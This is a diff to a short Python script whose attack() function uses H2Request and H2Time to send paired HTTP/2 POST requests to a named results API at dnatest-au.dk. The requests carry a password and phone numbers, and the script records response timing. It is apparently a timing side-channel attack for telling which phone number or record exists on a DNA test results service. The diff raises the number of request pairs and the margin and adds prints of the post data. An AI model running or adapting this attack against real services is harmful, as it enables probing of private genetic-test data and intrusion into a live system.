@@ -5,15 +5,21 @@ import string
 
 async def attack():
     # oprindeligt k=2000 og num_request_pairs=4
-    post_data = 'password=12345789abc&phone=61401100'
+    post_data = 'password=12345789abc&phone=00000000'
     post_data2 = 'password=12345789abc&phone=61791169'
     r1 = H2Request('POST', 'https://dnatest-au.dk/api/results', {'content-length': str(len(post_data)),
                                                      'Content-Type': 'application/x-www-form-urlencoded'}, post_data)
     r2 = H2Request('POST', 'https://dnatest-au.dk/api/results', {'content-length': str(len(post_data2)),
                                                      'Content-Type': 'application/x-www-form-urlencoded'}, post_data2)
 
-    num_request_pairs = 6
-    margin = 1
+    # Print request 1 post_data
+    print("Request 1 post data: %s" % post_data)
+    print("Request 2 post data: %s" % post_data2)
+
+    print()
+
+    num_request_pairs = 10
+    margin = 3
     async with H2Time(r1, r2, num_request_pairs=num_request_pairs, num_padding_params=40, sequential=True, inter_request_time_ms=10) as h2t:
         results = await h2t.run_attack()
         output = '\n'.join(map(lambda x: ','.join(map(str, x)), results))
